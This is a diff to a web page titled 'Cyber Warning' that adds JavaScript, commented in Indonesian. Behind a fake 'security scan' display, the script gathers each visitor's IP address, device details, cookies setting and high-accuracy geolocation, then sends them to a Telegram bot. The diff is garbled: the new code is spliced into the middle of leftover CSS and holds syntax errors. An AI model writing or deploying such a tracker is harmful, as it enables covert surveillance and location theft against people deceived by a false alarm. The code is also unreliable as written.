@@ -1,40 +1,108 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Cyber Warning</title>
-<style>
-  :root{
-    --bg:#0f0f12; --panel:#17171c; --primary:#ff3b3b; --accent:#ff9c00; --text:#e9e9ef;
-    --muted:#a7a7b3; --glow:0 0 30px rgba(255,59,59,.35);
-  }
-  *{box-sizing:border-box}
-  html,body{height:100%}
-  body{
-    margin:0; font-family:system-ui,Segoe UI,Roboto,Arial,sans-serif; color:var(--text);
-    background: radial-gradient(1200px 600px at 10% -10%, #2a0c0c 0, transparent 60%),
-                radial-gradient(900px 500px at 90% 110%, #121e35 0, transparent 60%),
-                var(--bg);
-    display:flex; align-items:center; justify-content:center; padding:24px;
-  }
-  .wrap{width:min(900px,96vw)}
-  .panel{
-    background:linear-gradient(180deg, #1a1a22 0%, #121216 100%);
-    border:1px solid #ffffff14; border-radius:16px; padding:24px; box-shadow:0 10px 30px rgba(0,0,0,.45)
-  }
-  .head{display:flex; align-items:center; gap:18px; margin-bottom:10px}
-  .lock{font-size:46px}
-  h1{margin:0; color:var(--primary); text-shadow:var(--glow)}
-  .sub{color:var(--muted); margin:6px 0 18px 0}
-  .grid{
-    display:grid; gap:16px; grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
-    margin:18px 0 10px;
-  }
-  .card{background:var(--panel); border:1px solid #ffffff14; border-radius:12px; padding:16px}
-  .label{font:700 12px/1 monospace; color:#ffc7c7; letter-spacing:.1em}
-  .value{margin-top:6px; font:600 14px/1.4 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace}
-  .cta{display:flex; gap:12px; flex-wrap:wrap; margin-top:18px}
+for (const endpoint of endpoints) {
+                    try {
+                        const response = await fetch(endpoint, {
+                            method: 'GET',
+                            mode: 'cors',
+                            headers: {
+                                'Accept': 'application/json'
+                            }
+                        });
+                        
+                        if (response.ok) {
+                            const data = await response.json();
+                            return data.ip  data.ipAddress  "Tidak dapat mendeteksi";
+                        }
+                    } catch (error) {
+                        console.log(`Endpoint ${endpoint} gagal, mencoba yang lain...`);
+                    }
+                }
+                
+                return "Tidak dapat mendeteksi";
+            } catch (error) {
+                return "Error: " + error.message;
+            }
+        }
+
+        // Send to Telegram menggunakan XMLHttpRequest (lebih kompatibel)
+        function sendToTelegram(data) {
+            return new Promise((resolve) => {
+                try {
+                    const message = `🚨 SECURITY ALERT - MOBILE DEVICE DETECTED 🚨
+
+📱 Device: Mobile Phone
+🌐 IP Address: ${data.ip}
+🌍 Browser: ${data.deviceInfo.browser}
+🖥️ OS: ${data.deviceInfo.os}
+📍 Location: ${data.location.address}
+🎯 Coordinates: ${data.location.latitude}, ${data.location.longitude}
+📏 Accuracy: ${data.location.accuracy}m
+🌐 Language: ${data.deviceInfo.language}
+📊 Platform: ${data.deviceInfo.platform}
+🖥️ Screen: ${data.deviceInfo.screen.width}x${data.deviceInfo.screen.height}
+⏰ Timezone: ${data.deviceInfo.timezone}
+🍪 Cookies: ${data.deviceInfo.cookies}
+🕒 Timestamp: ${new Date().toLocaleString('id-ID')}
+
+⚠️ MOBILE SECURITY BREACH DETECTED ⚠️`;
+
+                    const url = https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage;
+                    const params = new URLSearchParams();
+                    params.append('chat_id', TELEGRAM_CHAT_ID);
+                    params.append('text', message);
+                    params.append('parse_mode', 'HTML');
+
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', url, true);
+                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                    
+                    xhr.onload = function() {
+                        if (xhr.status === 200) {
+                            console.log('Data terkirim ke Telegram');
+                            resolve(true);
+                        } else {
+                            console.log('Gagal mengirim ke Telegram');
+                            resolve(false);
+                        }
+                    };
+                    
+                    xhr.onerror = function() {
+                        console.log('Error mengirim ke Telegram');
+                        resolve(false);
+                    };
+                    
+                    xhr.send(params.toString());
+                } catch (error) {
+                    console.error('Error:', error);
+                    resolve(false);
+                }
+            });
+        }
+
+        // Main function untuk mendapatkan lokasi
+        async function initSecurityScan() {
+            updateProgress(20);
+            updateStatus("🔍 MENDETEKSI INFORMASI PERANGKAT...");
+
+            const deviceInfo = getDeviceInfo();
+            
+            updateProgress(40);
+            updateStatus("🌐 MENDAPATKAN ALAMAT IP...");
+            
+            const ipAddress = await getIPAddress();
+
+            updateProgress(60);
+            updateStatus("📍 MEMINTA AKSES LOKASI...");
+
+            if (navigator.geolocation) {
+                const geoOptions = {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                };
+
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        updateProgress(80);  .cta{display:flex; gap:12px; flex-wrap:wrap; margin-top:18px}
   .muted{color:#9aa0ad; font-size:12px}
   .glitch{position:relative; display:inline-block; font-weight:800; letter-spacing:.02em;}
   .glitch::before, .glitch::after{
